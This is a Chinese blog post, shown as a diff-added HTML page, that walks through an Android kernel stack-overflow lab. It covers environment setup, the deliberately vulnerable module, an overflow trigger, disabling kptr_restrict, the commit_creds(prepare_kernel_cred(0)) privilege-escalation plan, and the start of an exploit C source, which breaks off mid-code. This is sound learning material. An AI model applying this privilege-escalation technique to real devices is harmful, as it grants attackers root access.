@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="Kernel pwn 初探"/><meta name="keywords" content="pwn, QRZ's Blog" /><link rel="alternate" href="/blog/default" title="QRZ's Blog" ><link rel="shortcut icon" type="image/x-icon" href="/blog/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="http://www.qrzbing.cn/blog/2019/01/21/Kernel-pwn-初探/"/>
+
+<link rel="stylesheet" type="text/css" href="/blog/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/blog/css/style.css?v=2.11.0" />
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>Kernel pwn 初探 - QRZ's Blog</title>
+  <meta name="generator" content="Hexo 5.3.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/blog/." class="logo">QRZ's Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/blog/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/blog/archives/">
+        <li class="mobile-menu-item">Archives
+          </li>
+      </a><a href="/blog/tags/">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="/blog/categories/">
+        <li class="mobile-menu-item">Categories
+          </li>
+      </a><a href="/blog/about/">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/blog/." class="logo">QRZ's Blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/blog/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/blog/archives/">
+            Archives
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/blog/tags/">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/blog/categories/">
+            Categories
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/blog/about/">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">Kernel pwn 初探
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-01-21
+        </span></div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-text">内核栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text">漏洞触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A4%84%E9%97%AE%E9%A2%98"><span class="toc-text">第一处问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A4%84%E9%97%AE%E9%A2%98"><span class="toc-text">第二处问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="toc-text">我的解法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XMAN-%E5%86%AC%E4%BB%A4%E8%90%A5%E6%80%BB%E7%BB%93"><span class="toc-text">XMAN 冬令营总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><p>这次 XMAN 冬令营讲了很多有意思的东西，需要很长的时间来消化吸收。我先写一下这几天看的一个简单 pwn 入门吧。</p>
+<a id="more"></a>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇文章主要研究了 <a target="_blank" rel="noopener" href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground">AndroidKernelExploitationPlayground</a> 这个项目。最开始按照他的 exp 跑没有完全跑通，当然了，Android 发展这么快出现各种意外这也是很正常的。这次（2019 年1月）我尝试着在当前环境下搭环境并测试 <code>challenges/stack_buffer_overflow</code> 这个样例。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>搭建平台：Ubuntu 16.04</p>
+<p>目录树如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">playground</span><br><span class="line">├── android-sdk-linux</span><br><span class="line">├── arm-linux-androideabi-4.6</span><br><span class="line">├── goldfish</span><br><span class="line">└── kernel_exploit_challenges</span><br></pre></td></tr></table></figure>
+<p>内核代码下载：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git</span><br></pre></td></tr></table></figure>
+<p>clone 项目：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Fuzion24/AndroidKernelExploitationPlayground.git kernel_exploit_challenges</span><br></pre></td></tr></table></figure>
+<p>进入 <code>goldfish</code> 目录，将 branch 切换到 3.4：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> goldfish &amp;&amp; git checkout -t origin/android-goldfish-3.4</span><br></pre></td></tr></table></figure>
+<p><code>git am</code> 可以将 patch 应用到当前的内核，<code>--signoff</code> 意味着使用自己的提交者标识向提交消息添加 <code>Signed-off-by:</code> 一行。这里应该是修改了内核编译配置，把项目中带漏洞中的模块编译进内核。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git am --signoff &lt; ../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch &amp;&amp; \</span><br><span class="line"><span class="built_in">cd</span> .. &amp;&amp; ln -s $(<span class="built_in">pwd</span>)/kernel_exploit_challenges/ goldfish/drivers/vulnerabilities</span><br></pre></td></tr></table></figure>
+<p>接下来下载 arm-linux-androideabi-4.6 交叉编译工具链，解压后添加到环境变量中（推荐加入到 <code>.bashrc</code> 中）。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://aosp.tuna.tsinghua.edu.cn/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6</span><br><span class="line">tar xvf arm-linux-androideabi-4.6.tar.bz2</span><br><span class="line"><span class="built_in">export</span> PATH=YOURPATH/arm-linux-androideabi-4.6/bin/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+<p>然后开始编译内核：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ARCH=arm SUBARCH=arm CROSS_COMPILE=arm-linux-androideabi- &amp;&amp;\</span><br><span class="line"><span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>)/arm-linux-androideabi-4.6/bin/:<span class="variable">$PATH</span> &amp;&amp; \</span><br><span class="line"><span class="built_in">cd</span> goldfish &amp;&amp; make goldfish_armv7_defconfig &amp;&amp; make -j8</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>编译完成后，就会有两个主要的文件：<code>goldfish/vmlinux</code> 和 <code>goldfish/arch/arm/boot/zImage</code>。前面那个用于在调试时 <code>gdb</code>加载，后面的用于在安卓模拟器启动时加载。</p>
+</blockquote>
+<p><code>vmlinux</code> 用于提供符号表，<code>zImage</code> 则用于运行环境。</p>
+<p>接下来下载安卓 SDK。（其实这里最好应该自己编译，SDK 的模拟器功能太少了，有的功能也不是我们想要的）下载完成后解压并将 <code>android-sdk-linux/tools</code> 加入环境变量（<code>.bashrc</code>）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz</span><br><span class="line">tar xvf android-sdk_r24.4.1-linux.tgz</span><br><span class="line"><span class="built_in">export</span> PATH=YOURPATH/android-sdk-linux/tools:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+<p>别忘了下载 jdk，我直接用的 apt 源：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install default-jre default-jdk</span><br></pre></td></tr></table></figure>
+<p>接下来在终端中输入 <code>android</code> ，下载我们需要的 SDK 和系统镜像：</p>
+<p><img src="https://ws1.sinaimg.cn/large/79b6884ely1fzel92eejgj20vi0gw77b.jpg"></p>
+<p>接下来创建模拟器：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android create avd --force -t <span class="string">&quot;android-19&quot;</span> -n kernel_challenges</span><br></pre></td></tr></table></figure>
+<p>接下来进入 goldfish 目录，执行下面的命令用我们的内核运行模拟器，并在 1234 端口 起一个 gdbserver 方便内核调试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -show-kernel -kernel arch/arm/boot/zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:/tmp/qemuSocket,server,nowait -s</span><br></pre></td></tr></table></figure>
+<p>再开一个 shell，进入 goldfish 目录，加载 vmlinux 以便调试内核：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-androideabi-gdb vmlinux</span><br></pre></td></tr></table></figure>
+<p>可能会出现这个问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-androideabi-gdb: error while loading shared libraries: libpython2.6.so.1.0: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure>
+<p>解决方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/lib/x86_64-linux-gnu/libpython2.7.so /usr/lib/x86_64-linux-gnu/libpython2.6.so.1.0</span><br></pre></td></tr></table></figure>
+<p>当然还可能会有报错。。ldd 一下发现他是从 <code>/lib/x86_64-linux-gnu</code> 找的 so 文件。所以可以这样改：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/lib/x86_64-linux-gnu/libpython2.7.so /lib/x86_64-linux-gnu/libpython2.6.so.1.0</span><br></pre></td></tr></table></figure>
+<p>一般来讲这样就解决了。</p>
+<p>一切正常的话应该会输出如下：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GNU gdb (GDB) 7.3.1-gg2</span><br><span class="line">Copyright (C) 2011 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http:&#x2F;&#x2F;gnu.org&#x2F;licenses&#x2F;gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;--host&#x3D;x86_64-apple-darwin --target&#x3D;arm-linux-android&quot;.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;gdb&#x2F;bugs&#x2F;&gt;...</span><br><span class="line">Reading symbols from &lt;REDACTED&gt;&#x2F;goldfish&#x2F;vmlinux...done.</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<p>当然因为我之前装过了 pwndbg，这里会有一些报错，在此我略过不表。</p>
+</blockquote>
+<p>然后连接模拟器里的调试端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote :1234</span><br></pre></td></tr></table></figure>
+<p>会进入到一个函数中，不管他，我们 continue 就好啦，想下断点的时候就来一个 <code>Ctrl+C</code>。虽然学长的博客中说看到这样的输出：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Remote debugging using :1234</span><br><span class="line">cpu_v7_do_idle () at arch&#x2F;arm&#x2F;mm&#x2F;proc-v7.S:74</span><br><span class="line">74movpc, lr</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<p>就可以正常调试了，但我没有和他这个完全一样，也是可以的。</p>
+</blockquote>
+<p>最后的最后，我们还要安装 adb-tools：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install android-tools-adb</span><br></pre></td></tr></table></figure>
+<p>终于，漫长的环境搭建结束了。。。</p>
+<h1 id="内核栈溢出"><a href="#内核栈溢出" class="headerlink" title="内核栈溢出"></a>内核栈溢出</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>看漏洞代码，这一次我看的代码位于 <code>kernel_exploit_challenges/challenges/stack_buffer_overflow/module/stack_buffer_overflow.c</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LENGTH 64</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Ryan Welton&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Stack Buffer Overflow Example&quot;</span>);</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">stack_buffer_proc_entry</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">proc_entry_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, <span class="keyword">unsigned</span> <span class="keyword">long</span> count, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;stackBufferProcEntry: error copying data from userspace\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">stack_buffer_proc_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    stack_buffer_proc_entry = create_proc_entry(<span class="string">&quot;stack_buffer_overflow&quot;</span>, <span class="number">0666</span>, <span class="literal">NULL</span>);</span><br><span class="line">    stack_buffer_proc_entry-&gt;write_proc = proc_entry_write;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;created /proc/stack_buffer_overflow\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">stack_buffer_proc_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stack_buffer_proc_entry) &#123;</span><br><span class="line">        remove_proc_entry(<span class="string">&quot;stack_buffer_overflow&quot;</span>, stack_buffer_proc_entry);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;vuln_stack_proc_entry removed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(stack_buffer_proc_init);</span><br><span class="line">module_exit(stack_buffer_proc_exit);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>上述代码会创建 <code>/proc/stack_buffer_overflow</code> 设备文件 ，当向该设备文件调用 <code>write</code> 系统调用时会调用 <code>proc_entry_write</code>函数进行处理。</p>
+</blockquote>
+<p>在这里我们需要了解系统调用的基础知识，在向 <code>stack_buffer_overflow</code> 写入时，相关的数据并不会直接写入设备中，而是经过类似于驱动程序的东西，在内核空间中执行。而内核 pwn 就是根据这一点在内核中提权拿 shell。</p>
+<blockquote>
+<p>漏洞显而易见，在 <code>proc_entry_write</code> 函数中 定义了一个 <code>64</code> 字节大小的栈缓冲区<code>buf</code>， 然后使用 <code>copy_from_user(&amp;buf, ubuf, count)</code> 从用户空间 拷贝数据到 <code>buf</code>,数据大小和内容均用户可控。于是当我们输入超过<code>64</code>字节时我们能够覆盖其他的数据，比如返回地址等，进而劫持程序执行流到我们的 <code>shellcode</code> 中 进行提权。</p>
+</blockquote>
+<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>我们可以通过如下方式触发漏洞。</p>
+<p>开启模拟器，<code>adb shell</code> 进入模拟器，用 <code>echo</code> 命令向 <code>/proc/stack_buffer_overflow</code> 设备输入大于等于 72 字节的数据（为什么是 72 字节呢？）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt;  /proc/stack_buffer_overflow</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/79b6884ely1fzem66ed9hj212o0ipjxu.jpg"></p>
+<p>学长博客里写的是 PC 寄存器的值为 0x41414141 成功劫持，但是我实际测试的时候可以看出并没有体现这一点。不过终究是触发了 panic，说明我们的输入是有效的。测试的时候没开 pxn（这个地方我纠结了好久，怎样看 pxn 是否开启呢？），所以我们可以在用户态编写 shellcode 让内核去执行。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote>
+<p>提取的方式很简单，内核态调用  <code>commit_creds(prepare_kernel_cred(0));</code> 提升权限为 root，然后返回 用户态执行 <code>execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</code> 起一个 <code>root</code> 权限的 <code>shell</code>， 完成提权。</p>
+</blockquote>
+<p>这里有几个需要注意的细节。在内核中想要获取 root 权限不能只用 <code>system(&quot;/bin/sh&quot;);</code>，而是应该用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred (<span class="number">0</span>));</span><br></pre></td></tr></table></figure>
+<p>这个函数分配并应用了一个新的凭证结构（uid = 0, gid = 0）从而获取root权限。也就是说，我们栈溢出的执行流权限并不是很高，但是在内核中我们可以通过执行上述代码来提权，而用户空间则不能执行这条指令。</p>
+<blockquote>
+<p>下面先获取 <code>prepare_kernel_cred</code> 和 <code>commit_creds</code> 函数的地址。在 <code>/proc/kallsyms</code> 文件中保存着所有的内核符号的名称和它在内存中的位置。</p>
+<p>不过在最近的内核版本中，为了使利用内核漏洞变得更加困难，<code>linux</code> 内核目前禁止一般用户获取符号。具体可以看这里。</p>
+<p>当启用 <code>kptr_restrict</code> 时我们是不能获取内核符号地址的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@generic:/ <span class="comment"># cat /proc/kallsyms | grep commit_creds               &gt;    </span></span><br><span class="line">00000000 T commit_creds</span><br></pre></td></tr></table></figure>
+<p>在本文中，把它禁用掉，不管他。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@generic:/ <span class="comment"># echo 0 &gt; /proc/sys/kernel/kptr_restrict               &gt; </span></span><br><span class="line">root@generic:/ <span class="comment"># cat /proc/kallsyms | grep commit_creds               &gt;</span></span><br><span class="line">c0039834 T commit_creds</span><br><span class="line">root@generic:/ <span class="comment"># cat /proc/kallsyms | grep prepare_kernel_cred                 </span></span><br><span class="line">c0039d34 T prepare_kernel_cred</span><br></pre></td></tr></table></figure>
+<p>禁用掉之后，我们就可以通过 <code>/proc/kallsyms</code> 获取 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code>的地址。</p>
+<p>至此，提权的问题解决了，下面就是要回到用户态，在<code>x86</code>平台有 <code>iret</code>指令可以回到用户态，在<code>arm</code>下返回用户态就更简单了。在<code>arm</code>下 <code>cpsr</code> 寄存器的 <code>M[4：0]</code> 位用来表示 处理器的运行模式，具体可以看<a target="_blank" rel="noopener" href="http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html">这个</a>。</p>
+<p>所以我们把 <code>cpsr</code> 寄存器的 <code>M[4：0]</code> 位设置为 <code>10000</code> 后就表示 处理器进入了用户模式。</p>
+<p>所以现在的利用思路是：</p>
+<ul>
+<li>调用 <code>commit_creds(prepare_kernel_cred(0))</code> 提升权限</li>
+<li>调用 <code>mov r3, #0x40000010; MSR CPSR_c,R3;</code>设置 <code>cpsr</code>寄存器，使<code>cpu</code>进入用户模式</li>
+<li>然后执行 <code>execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</code> 起一个 <code>root</code> 权限的 <code>shell</code></li>
+</ul>
+</blockquote>
+<p>接下来学长给出了他的 exp，但是学长的 exp 在我的设备跑不起来，这当然有环境不同的原因，我们可以看一下他的 exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 64</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_file</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/stack_buffer_overflow&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;open&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] enjoy the shell\n&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/system/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">uint32_t</span> shellCode[];</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;    .text\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    .align 2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    .code 32\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    .globl shellCode\n\t&quot;</span></span><br><span class="line">    <span 